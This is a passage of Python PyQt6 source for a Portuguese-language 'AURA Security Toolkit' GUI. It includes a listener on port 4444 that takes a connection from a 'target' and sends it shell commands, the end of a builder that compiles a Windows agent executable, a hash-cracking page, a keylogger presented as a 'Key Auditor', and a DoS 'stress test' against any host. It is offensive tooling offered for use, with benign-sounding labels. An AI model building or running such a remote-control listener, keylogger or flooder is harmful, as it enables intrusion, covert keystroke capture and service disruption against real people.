                processo = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                stdout, stderr = processo.communicate()
                
                if processo.returncode == 0:
                    self.status_log.setText(f"<b>[SUCESSO]</b> Agente gerado!<br>Arquivo: <b>temp_win_agent.exe</b>")
                else:
                    print(f"ERRO DE COMPILAÇÃO:\n{stderr.decode()}")
                    self.status_log.setText("<b>[ERRO]</b> Falha ao compilar. Verifique o terminal.")

        except Exception as e:
            self.status_log.setText(f"<b>[ERRO]</b>: {str(e)}")


# --- PAGINA DE CONTROLE ---
class ListenerPage(QWidget):
    def __init__(self, parent_window):
        super().__init__()
        self.parent_window = parent_window
        self.server_socket = None
        self.client_socket = None
        self._setup_ui()

    def _setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(30, 30, 30, 30)

        self.title = QLabel("📡 Painel de Controle Remoto")
        self.title.setFont(QFont("Arial", 18, QFont.Weight.Bold))
        layout.addWidget(self.title)

        self.status_conn = QLabel("Status: Aguardando ativação...")
        self.status_conn.setStyleSheet("color: orange; font-weight: bold;")
        layout.addWidget(self.status_conn)

        self.console_output = QLabel("Log do Servidor...")
        self.console_output.setStyleSheet("background-color: black; color: #00ff00; padding: 10px; font-family: 'Consolas';")
        self.console_output.setWordWrap(True)
        self.console_output.setAlignment(Qt.AlignmentFlag.AlignTop)
        layout.addWidget(self.console_output)

        self.cmd_input = QLineEdit()
        self.cmd_input.setPlaceholderText("Digite um comando (ex: stress_test, dir, whoami)...")
        self.cmd_input.setEnabled(False)
        self.cmd_input.returnPressed.connect(self.send_command)
        layout.addWidget(self.cmd_input)

        self.btn_listen = QPushButton("Ativar Escuta (Porta 4444)")
        self.btn_listen.clicked.connect(self.start_listening_thread)
        layout.addWidget(self.btn_listen)

        layout.addStretch()

    def start_listening_thread(self):
        self.btn_listen.setEnabled(False)
        self.status_conn.setText("Status: Escutando na porta 4444...")
        thread = threading.Thread(target=self.start_server, daemon=True)
        thread.start()

    def start_server(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.bind(('0.0.0.0', 4444))
            self.server_socket.listen(1)
            
            self.client_socket, addr = self.server_socket.accept()
            self.status_conn.setText(f"Status: CONECTADO ao alvo ({addr[0]})")
            self.status_conn.setStyleSheet("color: #00ff00; font-weight: bold;")
            self.cmd_input.setEnabled(True)
        except Exception as e:
            self.console_output.setText(f"Erro no Servidor: {e}")

    def send_command(self):
        cmd = self.cmd_input.text()
        if cmd and self.client_socket:
            try:
                self.client_socket.send(cmd.encode())
                response = self.client_socket.recv(4096).decode()
                self.console_output.setText(f"> {cmd}\n{response}")
                self.cmd_input.clear()
            except Exception as e:
                self.status_conn.setText("Status: Conexão Perdida.")
                self.cmd_input.setEnabled(False)


# --- JOHN THE RIPPER ---
class JohnWorker(QThread):
    progress = pyqtSignal(int, int) 
    finished = pyqtSignal(dict)

    def __init__(self, target_hash, payload, algorithm, salt=None, mode="wordlist", rules=False):
        super().__init__()
        self.target_hash = target_hash
        self.payload = payload # Pode ser o caminho da wordlist ou a string da máscara
        self.algorithm = algorithm
        self.salt = salt
        self.mode = mode
        self.rules = rules
        self.engine = JohnEngine()

    def run(self):
        if self.mode == "wordlist":
            result = self.engine.crack_wordlist(
                target_hash=self.target_hash, 
                wordlist_path=self.payload, 
                algorithm=self.algorithm, 
                salt=self.salt,
                use_rules=self.rules,
                callback=self.progress.emit
            )
        else:
            result = self.engine.crack_mask(
                target_hash=self.target_hash, 
                mask=self.payload, 
                algorithm=self.algorithm, 
                salt=self.salt,
                callback=self.progress.emit
            )
        self.finished.emit(result)

class JohnPage(QWidget):
    def __init__(self, parent_window):
        super().__init__()
        self.parent_window = parent_window
        self.wordlist_path = "" # Inicializa aqui
        self._setup_ui()

    def _setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(30, 30, 30, 30)

        # Título
        title = QLabel("💀 John The Ripper - Hash Cracker")
        title.setFont(QFont("Arial", 22, QFont.Weight.Bold))
        layout.addWidget(title)

        # --- Seção Comum (Sempre Visível) ---
        common_group = QGroupBox("Configurações Básicas")
        common_group.setStyleSheet("QGroupBox { color: #888; border: 1px solid #333; margin-top: 10px; padding: 10px; }")
        common_layout = QVBoxLayout()

        common_layout.addWidget(QLabel("Hash Alvo:"))
        self.hash_input = QLineEdit()
        self.hash_input.setPlaceholderText("Insira o hash aqui...")
        common_layout.addWidget(self.hash_input)

        row2 = QHBoxLayout()
        self.mode_combo = QComboBox()
        self.mode_combo.addItems(["Wordlist", "Máscara"])
        self.mode_combo.currentTextChanged.connect(self.toggle_mode)
        row2.addWidget(QLabel("Modo de Ataque:"))
        row2.addWidget(self.mode_combo)

        self.algo_combo = QComboBox()
        self.algo_combo.addItems(["Auto-Detectar", "MD5", "SHA1", "SHA256", "SHA512"])
        row2.addWidget(QLabel("Algoritmo:"))
        row2.addWidget(self.algo_combo)
        
        common_layout.addLayout(row2)
        common_group.setLayout(common_layout)
        layout.addWidget(common_group)

        # --- Seção WORDLIST (Container dinâmico) ---
        self.wordlist_container = QWidget()
        wordlist_l = QVBoxLayout(self.wordlist_container)
        
        row_wl = QHBoxLayout()
        self.btn_wordlist = QPushButton("Selecionar Arquivo Wordlist")
        self.btn_wordlist.clicked.connect(self.select_file)
        row_wl.addWidget(self.btn_wordlist)
        
        self.check_rules = QCheckBox("Aplicar Regras (John Style)")
        row_wl.addWidget(self.check_rules)
        wordlist_l.addLayout(row_wl)
        
        layout.addWidget(self.wordlist_container)

        # --- Seção MÁSCARA (Container dinâmico) ---
        self.mask_container = QWidget()
        mask_l = QVBoxLayout(self.mask_container)
        
        self.mask_input = QLineEdit()
        self.mask_input.setPlaceholderText("Ex: ?l?l?l?d?d (L=letra, D=digito)")
        mask_l.addWidget(QLabel("Definição da Máscara:"))
        mask_l.addWidget(self.mask_input)
        
        layout.addWidget(self.mask_container)
        self.mask_container.hide() # Começa escondido

        # --- Salt e Botão ---
        self.salt_input = QLineEdit()
        self.salt_input.setPlaceholderText("Salt (Opcional)")
        layout.addWidget(QLabel("Salt/Sal:"))
        layout.addWidget(self.salt_input)

        self.btn_start = QPushButton("INICIAR ATAQUE")
        self.btn_start.setFixedHeight(50)
        self.btn_start.setStyleSheet(f"background: {self.parent_window.theme_manager.neon_color}; color: black; font-weight: bold;")
        self.btn_start.clicked.connect(self.start_cracking)
        layout.addWidget(self.btn_start)

        self.console = QTextEdit()
        self.console.setReadOnly(True)
        self.console.setStyleSheet("background: #000; color: #0f0; font-family: 'Courier New';")
        layout.addWidget(self.console)

    # Função que limpa a tela dependendo do modo
    def toggle_mode(self, mode):
        if mode == "Wordlist":
            self.wordlist_container.show()
            self.mask_container.hide()
        else:
            self.wordlist_container.hide()
            self.mask_container.show()

    def select_file(self):
        file, _ = QFileDialog.getOpenFileName(self, "Selecionar Wordlist", "", "Text Files (*.txt)")
        if file:
            self.wordlist_path = file
            self.btn_wordlist.setText(os.path.basename(file))

    def start_cracking(self):
        target = self.hash_input.text().strip()
        salt = self.salt_input.text().strip() or None
        algo = self.algo_combo.currentText()
        if algo == "Auto-Detectar": algo = None
        
        modo = self.mode_combo.currentText()

        if not target:
            QMessageBox.warning(self, "Erro", "Insira o Hash!")
            return

        self.console.clear()
        self.btn_start.setEnabled(False)
        self.btn_start.setText("EXECUTANDO...")

        if modo == "Wordlist":
            if not self.wordlist_path:
                QMessageBox.warning(self, "Erro", "Selecione a wordlist!")
                self.btn_start.setEnabled(True)
                return
            self.thread = JohnWorker(target, self.wordlist_path, algo, salt, mode="wordlist", rules=self.check_rules.isChecked())
        else:
            mask = self.mask_input.text().strip()
            if not mask:
                QMessageBox.warning(self, "Erro", "Insira a máscara!")
                self.btn_start.setEnabled(True)
                return
            self.thread = JohnWorker(target, mask, algo, salt, mode="mask")

        self.thread.progress.connect(self.update_status)
        self.thread.finished.connect(self.on_finished)
        self.thread.start()

    def update_status(self, tested, speed):
        # Atualiza a barra de status lá embaixo (limpo)
        msg = f"John: {tested} hashes testados | Velocidade: {speed} H/s"
        self.parent_window.status_label.setText(msg)
        
        # Só escreve no console a cada 5000 tentativas para não travar e nem poluir
        if tested % 5000 == 0:
            self.console.append(f"[*] Processando... {tested} candidatos testados.")

    def on_finished(self, result):
        self.btn_start.setEnabled(True)
        self.btn_start.setText("INICIAR ATAQUE")
        if result["success"]:
            path = self.thread.engine.save_result(result, self.parent_window.base_dir)
            msg = f"✅ SENHA ENCONTRADA: {result['password']}\nRelatório: {os.path.basename(path)}"
            self.console.append("\n" + "="*30 + "\n" + msg + "\n" + "="*30)
            QMessageBox.information(self, "Sucesso", msg)
        else:
            self.console.append(f"\n❌ FALHA: {result['error']}")

# --- KEYLOGGER ---
class KeyloggerPage(QWidget):
    def __init__(self, parent_window):
        super().__init__()
        self.parent_window = parent_window
        self.engine = None
        self.log_file_path = None
        
        # Timer para atualizar a tela em tempo real
        self.update_timer = QTimer()
        self.update_timer.timeout.connect(self.refresh_live_view)
        
        self._setup_ui()

    def _setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(30, 30, 30, 30)

        # Título Estilizado
        title = QLabel("⌨️ Key Auditor - Monitoramento")
        title.setFont(QFont("Arial", 22, QFont.Weight.Bold))
        layout.addWidget(title)

        # Painel de Status
        self.status_box = QFrame()
        self.status_box.setStyleSheet("background: #111; border: 1px solid #333; border-radius: 8px;")
        status_layout = QHBoxLayout(self.status_box)
        
        self.dot = QLabel("●") # Indicador visual (vermelho/cinza)
        self.dot.setStyleSheet("color: #444; font-size: 20px;")
        
        self.status_text = QLabel("STATUS: PRONTO PARA CAPTURA")
        self.status_text.setStyleSheet("color: #888; font-weight: bold;")
        
        status_layout.addWidget(self.dot)
        status_layout.addWidget(self.status_text)
        status_layout.addStretch()
        layout.addWidget(self.status_box)

        # Console de Visualização em Tempo Real
        layout.addWidget(QLabel("Atividade Recente:"))
        self.live_console = QTextEdit()
        self.live_console.setReadOnly(True)
        self.live_console.setStyleSheet("background: #000; color: #0f0; font-family: 'Courier New'; border: 1px solid #222;")
        layout.addWidget(self.live_console)

        # Botões de Controle
        btns = QHBoxLayout()
        
        self.btn_toggle = QPushButton("INICIAR AUDITORIA")
        self.btn_toggle.setFixedHeight(50)
        self.btn_toggle.setStyleSheet(f"background: {self.parent_window.theme_manager.neon_color}; color: black; font-weight: bold;")
        self.btn_toggle.clicked.connect(self.handle_toggle)
        
        self.btn_open_folder = QPushButton("📁 ABRIR LOGS")
        self.btn_open_folder.clicked.connect(self.open_log_folder)
        self.btn_open_folder.setStyleSheet("padding: 15px;")

        btns.addWidget(self.btn_toggle, 3)
        btns.addWidget(self.btn_open_folder, 1)
        layout.addLayout(btns)

    def handle_toggle(self):
        # Se não estiver rodando, inicia
        if not self.engine or not self.engine.is_running:
            log_dir = os.path.join(self.parent_window.base_dir, "logs/keylogs")
            self.engine = KeyloggerEngine(log_dir)
            self.log_file_path = self.engine.start()
            
            # UI Updates
            self.status_text.setText("MONITORANDO TECLADO...")
            self.status_text.setStyleSheet("color: #ff3333;")
            self.dot.setStyleSheet("color: #ff3333;")
            self.btn_toggle.setText("PARAR MONITORAMENTO")
            self.btn_toggle.setStyleSheet("background: #551111; color: white; font-weight: bold;")
            
            self.update_timer.start(1000) # Atualiza a tela a cada 1 segundo
        
        # Se estiver rodando, para
        else:
            self.engine.stop()
            self.update_timer.stop()
            self.status_text.setText("AUDITORIA FINALIZADA")
            self.status_text.setStyleSheet("color: #00ff00;")
            self.dot.setStyleSheet("color: #00ff00;")
            self.btn_toggle.setText("REINICIAR CAPTURA")
            self.btn_toggle.setStyleSheet(f"background: {self.parent_window.theme_manager.neon_color}; color: black;")

    def refresh_live_view(self):
        """Lê o arquivo de log e mostra as últimas teclas no console"""
        if self.log_file_path and os.path.exists(self.log_file_path):
            try:
                with open(self.log_file_path, "r", encoding="utf-8") as f:
                    content = f.read()
                    # Mostra apenas os últimos 1000 caracteres para não travar a UI
                    self.live_console.setText(content[-1000:])
                    self.live_console.moveCursor(QTextCursor.MoveOperation.End)
            except:
                pass

    def open_log_folder(self):
        log_dir = os.path.join(self.parent_window.base_dir, "logs/keylogs")
        os.makedirs(log_dir, exist_ok=True)
        # Comando para abrir pasta no Linux
        os.system(f"xdg-open {log_dir}")

# --- DDOS ---
class StressTestPage(QWidget):
    def __init__(self, parent_window):
        super().__init__()
        self.parent_window = parent_window
        self.executor = None
        self.ui_timer = QTimer()
        self.ui_timer.timeout.connect(self.update_live_metrics)
        self._setup_ui()

    def _setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(30, 30, 30, 30)
        layout.setSpacing(15)

        # Cabeçalho Técnico
        title = QLabel("🛡️ Avaliação de Resiliência de Firewall")
        title.setFont(QFont("Arial", 18, QFont.Weight.Bold))
        layout.addWidget(title)

        # Configurações de Alvo
        target_group = QGroupBox("Parâmetros do Alvo")
        t_layout = QHBoxLayout()
        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("IP ou Host")
        self.port_input = QSpinBox()
        self.port_input.setRange(1, 65535)
        self.port_input.setValue(80)
        t_layout.addWidget(QLabel("Alvo:"))
        t_layout.addWidget(self.target_input, 3)
        t_layout.addWidget(QLabel("Porta:"))
        t_layout.addWidget(self.port_input, 1)
        target_group.setLayout(t_layout)
        layout.addWidget(target_group)

        # Configurações de Controle
        ctrl_group = QGroupBox("Controle de Tráfego")
        c_layout = QVBoxLayout()
        
        self.rps_input = QSpinBox()
        self.rps_input.setRange(1, 2000)
        self.rps_input.setValue(50)
        c_layout.addWidget(QLabel("Taxa Limite (Req/Segunda - RPS):"))
        c_layout.addWidget(self.rps_input)

        self.duration_input = QSpinBox()
        self.duration_input.setRange(5, 600)
        self.duration_input.setValue(30)
        c_layout.addWidget(QLabel("Duração do Teste (Segundos):"))
        c_layout.addWidget(self.duration_input)

        self.gradual_check = QCheckBox("Escalonamento Gradual (Ramp-up)")
        c_layout.addWidget(self.gradual_check)
        
        ctrl_group.setLayout(c_layout)
        layout.addWidget(ctrl_group)

        # DASHBOARD DE MÉTRICAS (VISUAL)
        self.metrics_box = QTextEdit()
        self.metrics_box.setReadOnly(True)
        self.metrics_box.setStyleSheet("background: black; color: #00ff00; font-family: Consolas; font-size: 14px;")
        self.metrics_box.setText("Aguardando início do teste...")
        layout.addWidget(self.metrics_box)

        self.btn_action = QPushButton("⚡ INICIAR AUDITORIA DE TRÁFEGO")
        self.btn_action.setFixedHeight(50)
        self.btn_action.clicked.connect(self.toggle_test)
        layout.addWidget(self.btn_action)

    def toggle_test(self):
        if self.executor and self.executor.is_running:
            self.executor.is_running = False
            self.btn_action.setText("⚡ INICIAR AUDITORIA DE TRÁFEGO")
        else:
            self.executor = StressTestExecutor(
                target=self.target_input.text(),
                port=self.port_input.value(),
                rps_limit=self.rps_input.value(),
                duration=self.duration_input.value(),
                gradual=self.gradual_check.isChecked()
            )
            threading.Thread(target=self.executor.run, daemon=True).start()
            self.ui_timer.start(500) # Atualiza a cada meio segundo
            self.btn_action.setText("🛑 INTERROMPER TESTE")

    def update_live_metrics(self):
        if not self.executor: return
        
        s = self.executor.stats
        report = (
            f"--- MÉTRICAS EM TEMPO REAL ---\n"
            f"Total Enviado: {s['total_sent']}\n"
            f"Sucesso (200 OK): {s['success']}\n"
            f"Bloqueio DROP (Timeout): {s['timeout_drop']}\n"
            f"Bloqueio REJECT (RST): {s['reset_reject']}\n"
            f"Latência Média: {round(s['avg_latency'], 2)}ms\n"
            f"-----------------------------\n"
            f"Status: {'EXECUTANDO' if self.executor.is_running else 'FINALIZADO'}"
        )
        self.metrics_box.setText(report)
        
        if not self.executor.is_running:
            self.ui_timer.stop()
            self.btn_action.setText("⚡ INICIAR AUDITORIA DE TRÁFEGO")

# --- CLASSE PRINCIPAL (MainWindow) ---
class MainWindow(QMainWindow):
    PAGE_HOME = 0
    PAGE_TOOLS = 1
    PAGE_SCANNER = 2
    PAGE_SCRIPTS = 3
    PAGE_LOGS = 4
    PAGE_CONFIG = 5
    PAGE_FIREWALL = 6
    PAGE_PAYLOAD = 7
    PAGE_LISTENER = 8
    PAGE_STRESS = 9
    PAGE_OSINT = 10
    PAGE_JOHN = 11
    PAGE_KEYLOGGER = 12
    PAGE_HYDRA = 13

    def safe_change_page(self, index):
        if 0 <= index < self.pages.count():
            self.pages.setCurrentIndex(index)
            self.status_label.setText(f"Status: Página {index} carregada")

    def open_hydra_with_targets(self, targets):
        self.hydra_page.set_targets(targets)
        self.safe_change_page(self.PAGE_HYDRA)

    def __init__(self, base_dir):
        super().__init__()
        self.base_dir = base_dir

        self.user_settings = load_user_settings(self.base_dir)
        self.theme_manager = ThemeManager(self.user_settings)
        self.current_lang_code = self.user_settings.get('language', 'pt')
        self.L = load_language_json(self.current_lang_code, self.base_dir)

        self.setWindowTitle("AURA Security Toolkit")
        self.setGeometry(100, 100, 1200, 800)

        self._build_ui()
        self._apply_theme(self.theme_manager.current_theme)
        self.update_ui_language(self.current_lang_code)

        self.show()
        QApplication.processEvents()
        self._refresh_neon_fix()

    def _refresh_neon_fix(self):
        neon_color = self.theme_manager.neon_color
        for card in self.findChildren(NeonCard):
            card.set_neon_color(neon_color, self.theme_manager.current_theme)
            card.update()

    def _build_placeholder_page(self, text):
        page = QWidget()
        layout = QVBoxLayout(page)
        label = QLabel(text)
        label.setWordWrap(True)
        label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        layout.addStretch()
        layout.addWidget(label)
        layout.addStretch()
        return page

    def _build_ui(self):
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QHBoxLayout(central_widget)
        main_layout.setContentsMargins(0, 0, 0, 0)
        main_layout.setSpacing(0)

        self.sidebar = QFrame()
        self.sidebar.setFixedWidth(200)
        self.sidebar.setObjectName("Sidebar")
        sidebar_layout = QVBoxLayout(self.sidebar)
        sidebar_layout.setContentsMargins(10, 20, 10, 10)
        sidebar_layout.setSpacing(10)

        self.title_label = QLabel("AURA")
        self.title_label.setFont(QFont("Arial", 24, QFont.Weight.Bold))
        self.title_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.title_label.setObjectName("AuraTitle")
        sidebar_layout.addWidget(self.title_label)

        self.btn_home = self._make_sidebar_button("Home", "🏠")
        self.btn_tools = self._make_sidebar_button("Ferramentas", "🛠️")
        self.btn_scanner = self._make_sidebar_button("Scanner", "🛰️")
        self.btn_scripts = self._make_sidebar_button("Scripts", "📜")
        self.btn_logs = self._make_sidebar_button("Logs", "📁")
        self.btn_config = self._make_sidebar_button("Configurações", "⚙️")

        self.sidebar_buttons = [
            self.btn_home,
            self.btn_tools,
            self.btn_scanner,
            self.btn_scripts,
            self.btn_logs,
            self.btn_config,
        ]
        for btn in self.sidebar_buttons:
            sidebar_layout.addWidget(btn)

        sidebar_layout.addItem(
            QSpacerItem(20, 40, QSizePolicy.Policy.Minimum, QSizePolicy.Policy.Expanding)
        )

        self.status_label = QLabel("Status: Pronto")
        sidebar_layout.addWidget(self.status_label)
        main_layout.addWidget(self.sidebar)

        self.content_frame = QFrame()
        self.content_frame.setObjectName("ContentFrame")
        content_v_layout = QVBoxLayout(self.content_frame)
        content_v_layout.setContentsMargins(0, 0, 0, 0)

        self.pages = QStackedWidget()

        home_page = QWidget()
        home_layout = QVBoxLayout(home_page)
        self.welcome_label = QLabel("Bem-vindo ao AURA Security Toolkit!")
        self.welcome_label.setFont(QFont("Arial", 16, QFont.Weight.Bold))
        home_layout.addWidget(self.welcome_label)

        card_grid = QGridLayout()
        card_grid.setSpacing(15)

        self.card_scanner = NeonCard("🛰️", "Varredura", "Identifica hosts.", self.theme_manager.neon_color, self.theme_manager)
        self.card_scanner.on_card_activated = lambda: self.safe_change_page(self.PAGE_SCANNER)

        self.card_stress = NeonCard("🔥", "Stress Test", "Simulação DoS.", self.theme_manager.neon_color, self.theme_manager)
        self.card_stress.on_card_activated = lambda: self.safe_change_page(self.PAGE_STRESS)

        self.card_firewall = NeonCard("🛡️", "Firewall", "Verifica regras.", self.theme_manager.neon_color, self.theme_manager)
        self.card_firewall.on_card_activated = lambda: self.safe_change_page(self.PAGE_FIREWALL)

        self.card_osint = NeonCard("🔍", "Sherlock", "OSINT Social.", self.theme_manager.neon_color, self.theme_manager)
        self.card_osint.on_card_activated = lambda: self.safe_change_page(self.PAGE_OSINT)

        self.card_john = NeonCard("💀", "John Ripper", "Quebra hashes.", self.theme_manager.neon_color, self.theme_manager)
        self.card_john.on_card_activated = lambda: self.safe_change_page(self.PAGE_JOHN)

        self.card_keylogger = NeonCard("⌨️", "Key Auditor", "Log de teclado.", self.theme_manager.neon_color, self.theme_manager)
        self.card_keylogger.on_card_activated = lambda: self.safe_change_page(self.PAGE_KEYLOGGER)

        self.card_hydra = NeonCard("🧰", "Hydra", "Teste credenciais.", self.theme_manager.neon_color, self.theme_manager)
        self.card_hydra.on_card_activated = lambda: self.safe_change_page(self.PAGE_HYDRA)

        card_grid.addWidget(self.card_scanner, 0, 0)
        card_grid.addWidget(self.card_stress, 0, 1)
        card_grid.addWidget(self.card_firewall, 0, 2)
        card_grid.addWidget(self.card_osint, 1, 0)
        card_grid.addWidget(self.card_john, 1, 1)
        card_grid.addWidget(self.card_keylogger, 1, 2)
        card_grid.addWidget(self.card_hydra, 2, 0)

        home_layout.addLayout(card_grid)
        home_layout.addStretch()
        self.pages.addWidget(home_page)

        self.pages.addWidget(self._build_placeholder_page("Página de ferramentas em consolidação."))

        self.scanner_page = ScannerPage(self)
        self.pages.addWidget(self.scanner_page)

        self.pages.addWidget(self._build_placeholder_page("Página de scripts em consolidação."))
        self.pages.addWidget(self._build_placeholder_page("Página de logs em consolidação."))

        self.config_page = ConfigPage(self)
        self.pages.addWidget(self.config_page)

        self.firewall_page = FirewallPage(self)
        self.pages.addWidget(self.firewall_page)

        self.payload_page = PayloadPage(self)
        self.pages.addWidget(self.payload_page)

        self.listener_page = ListenerPage(self)
        self.pages.addWidget(self.listener_page)

        self.stress_page = StressTestPage(self)
        self.pages.addWidget(self.stress_page)

        self.osint_page = SherlockPage(self)
        self.pages.addWidget(self.osint_page)

        self.john_page = JohnPage(self)
        self.pages.addWidget(self.john_page)

        self.key_auditor_page = KeyloggerPage(self)
        self.pages.addWidget(self.key_auditor_page)

        self.hydra_page = HydraPage(self)
        self.pages.addWidget(self.hydra_page)

        content_v_layout.addWidget(self.pages)
        main_layout.addWidget(self.content_frame)

        self.btn_home.clicked.connect(lambda: self.safe_change_page(self.PAGE_HOME))
        self.btn_tools.clicked.connect(lambda: self.safe_change_page(self.PAGE_TOOLS))
        self.btn_scanner.clicked.connect(lambda: self.safe_change_page(self.PAGE_SCANNER))
        self.btn_scripts.clicked.connect(lambda: self.safe_change_page(self.PAGE_SCRIPTS))
        self.btn_logs.clicked.connect(lambda: self.safe_change_page(self.PAGE_LOGS))
        self.btn_config.clicked.connect(lambda: self.safe_change_page(self.PAGE_CONFIG))

    def _make_sidebar_button(self, text, icon):
        btn = QPushButton(f"  {icon} {text}")
        btn.setObjectName("SidebarButton")
        btn.setFixedHeight(45)
        btn.setCursor(Qt.CursorShape.PointingHandCursor)
        return btn

    def get_theme_colors(self, theme_key=None):
        return THEMES.get(theme_key or self.theme_manager.current_theme, THEMES['dark'])

    def _apply_theme(self, theme_key):
        T = self.get_theme_colors(theme_key)
        neon_color = self.theme_manager.neon_color

        style = f"""
        QMainWindow {{
            background-color: {T['bg_main']};
        }}
        QFrame#Sidebar {{
            background-color: {T['bg_sidebar']};
        }}
        QFrame#ContentFrame, QWidget#PageWidget {{
            background-color: {T['bg_main']};
        }}
        QLabel {{
            color: {T['text_main']};
        }}
        QLabel#AuraTitle {{
            color: {neon_color};
        }}
        QPushButton#SidebarButton {{
            background-color: {T['bg_button']};
            color: {T['text_main']};
            border: none;
            border-radius: 8px;
            padding-left: 15px;
        }}
        QPushButton#SidebarButton:hover {{
            background-color: {T['bg_button_hover']};
            color: {T['text_main']};
        }}
        QGroupBox {{
            color: {T['text_main']};
            border: 1px solid {T['border_card']};
            border-radius: 10px;
            padding-top: 20px;
            margin-top: 10px;
            background-color: {T['bg_main']};
        }}
        QLineEdit {{
            background-color: {T['bg_input']};
            color: {T['text_main']};
            border: 1px solid {T['border_card']};
            border-radius: 5px;
            padding: 5px;
        }}
        QScrollArea {{
            background-color: {T['bg_main']};
            border: none;
        }}
        QScrollArea QWidget {{
            background-color: {T['bg_main']};
        }}
        QComboBox {{
            background-color: {T['bg_input']};
            color: {T['text_main']};
            border: 1px solid {T['border_card']};
            border-radius: 5px;
            padding: 3px;
        }}
        QRadioButton {{
            color: {T['text_main']};
            background-color: {T['bg_main']};
        }}
        QPushButton {{
            background-color: {T['bg_button']};
            color: {T['text_main']};
            border: none;
            border-radius: 5px;
            padding: 8px 15px;
        }}
        QPushButton:hover {{
            background-color: {T['bg_button_hover']};
        }}
        """
        self.setStyleSheet(style)

        for card in self.findChildren(NeonCard):
            card.set_neon_color(neon_color, self.theme_manager.current_theme)

    def apply_base_theme(self, theme_name):
        self.theme_manager.set_base_theme(theme_name)
        self._apply_theme(theme_name)

    def set_global_neon_color(self, color):
        self.theme_manager.set_neon_color(color)
        self._apply_theme(self.theme_manager.current_theme)

    def apply_language(self, lang_name):
        lang_map = {
            "Português": "pt",
            "Inglês": "en",
            "Espanhol": "es",
            "Francês": "fr",
            "Alemão": "de",
            "Italiano": "it",
            "Russo": "ru",
            "Chinês": "zh",
            "Coreano": "ko",
            "Japonês": "ja",
            "Árabe": "ar",
        }

        lang_code = lang_map.get(lang_name, "pt")
        self.L = load_language_json(lang_code, self.base_dir)
        self.current_lang_code = lang_code
        self.update_ui_language(lang_code)

        QTimer.singleShot(50, self._refresh_neon_fix)

    def update_ui_language(self, lang_code):
        L = self.L

        self.btn_home.setText("  🏠 " + lang_get(L, "sidebar.home", "Home"))
        self.btn_tools.setText("  🛠️ " + lang_get(L, "sidebar.tools", "Ferramentas"))
        self.btn_scanner.setText("  🛰️ " + lang_get(L, "sidebar.scanner", "Scanner"))
        self.btn_scripts.setText("  📜 " + lang_get(L, "sidebar.scripts", "Scripts"))
        self.btn_logs.setText("  📁 " + lang_get(L, "sidebar.logs", "Logs"))
        self.btn_config.setText("  ⚙️ " + lang_get(L, "sidebar.settings", "Configurações"))
        self.status_label.setText(lang_get(L, "header.status_ready", "Status: Pronto"))

        self.config_page.update_ui_language(L)
        self.scanner_page.update_ui_language(L)
        if hasattr(self.firewall_page, "update_ui_language"):
            self.firewall_page.update_ui_language(L)
        if hasattr(self.payload_page, "update_ui_language"):
            self.payload_page.update_ui_language(L)

        self.welcome_label.setText(
            lang_get(L, "home_page.welcome", "Bem-vindo ao AURA Security Toolkit!")
        )

        self.card_scanner.set_texts(
            lang_get(L, "cards.scanner.title", "Varredura de Rede"),
            lang_get(L, "cards.scanner.subtitle", "Varre e detecta hosts"),
        )
        self.card_stress.set_texts("Stress Test", "Simulação DoS.")
        self.card_firewall.set_texts(
            lang_get(L, "cards.ports.title", "Analisador de Portas"),
            lang_get(L, "cards.ports.subtitle", "Testa portas específicas"),
        )
        self.card_osint.set_texts("Sherlock", "OSINT Social.")
        self.card_john.set_texts("John Ripper", "Quebra hashes.")
        self.card_keylogger.set_texts("Key Auditor", "Log de teclado.")
        self.card_hydra.set_texts("Hydra", "Teste credenciais.")

        self.current_lang_code = lang_code

    def closeEvent(self, event):
        if hasattr(self, 'stress_page') and self.stress_page.executor:
            self.stress_page.executor.stop()

        self.user_settings['language'] = self.current_lang_code
        self.user_settings['theme'] = self.theme_manager.current_theme
        self.user_settings['neon_color'] = self.theme_manager.neon_color

        save_user_settings(self.base_dir, self.user_settings)

        super().closeEvent(event)

# --- EXECUÇÃO PRINCIPAL ---

if __name__ == "__main__":
    
    if getattr(sys, 'frozen', False):
        base_dir = os.path.dirname(sys.executable)
    else:
        base_dir = os.path.dirname(os.path.abspath(__file__))

    app = QApplication(sys.argv)
    
    palette = QPalette()
    palette.setColor(QPalette.ColorRole.Window, QColor(THEMES['dark']['bg_main']))
    app.setPalette(palette)
    
    window = MainWindow(base_dir)
    window.show()
    sys.exit(app.exec())
